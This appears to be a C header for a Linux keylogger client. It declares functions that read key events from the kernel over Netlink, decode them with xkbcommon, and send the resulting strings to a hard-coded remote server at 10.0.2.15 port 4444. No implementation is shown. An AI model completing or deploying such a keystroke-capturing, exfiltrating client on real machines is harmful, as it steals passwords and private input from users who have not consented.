#ifndef CLIENT_H
#define CLIENT_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <xkbcommon/xkbcommon.h>

#define SERVER_IP "10.0.2.15" // The IP address of the remote server.
#define SERVER_PORT 4444 // The port used for communication.
#define NETLINK_PROTOCOL 31 // The Netlink protocol number.
#define NETLINK_GROUP_ID 1 // The Netlink multicast group ID.
#define RECEIVE_BUFFER_SIZE 4096 // Buffer size for kernel events.
#define MAX_KEY_SYMBOL_LENGTH 64 // Maximum length for key string buffers.
#define XKB_KEYCODE_OFFSET 8 // Offset for X11 keycode compatibility.
#define SUCCESS_CODE 0 // Status code for successful operations.
#define FAILURE_CODE 1 // Status code for failed operations.

/**
 * @brief Sets up xkbcommon context, keymap, and internal state.
 * @return SUCCESS_CODE on success, FAILURE_CODE on failure.
 */
int initialize_xkb_system(void);

/**
 * @brief Releases allocated xkbcommon memory.
 */
void cleanup_xkb_system(void);

/**
 * @brief Listens for key events via Netlink and processes them via xkbcommon.
 * @param arg Pointer to the socket file descriptor.
 * @return NULL on thread exit.
 */
void *listen_for_netlink_events(void *arg);

/**
 * @brief Establishes a TCP connection to the remote server.
 * @return SUCCESS_CODE on success, FAILURE_CODE on failure.
 */
int connect_to_remote_server(void);

/**
 * @brief Transmits a character string to the remote server.
 * @param data The string to transmit.
 */
void transmit_data_to_server(const char *data);


/**
 * @brief listens for key events via Netlink and processes them via xkbcommon.
 * @param arg Pointer to the socket file descriptor.
 */
void *listen_for_netlink_events(void *arg);


#endif